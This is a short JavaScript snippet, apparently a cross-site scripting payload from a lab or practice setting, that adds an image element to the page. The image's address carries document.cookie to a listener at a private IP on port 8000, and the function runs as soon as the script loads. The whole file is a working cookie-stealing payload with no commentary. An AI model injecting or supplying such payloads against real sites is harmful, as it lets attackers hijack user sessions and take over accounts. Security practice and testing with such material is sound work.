function addImage(){
	var img = document.createElement("img");
	img.src = "http://192.168.119.137:8000/" + document.cookie;
	document.body.append(img);
}

addImage();
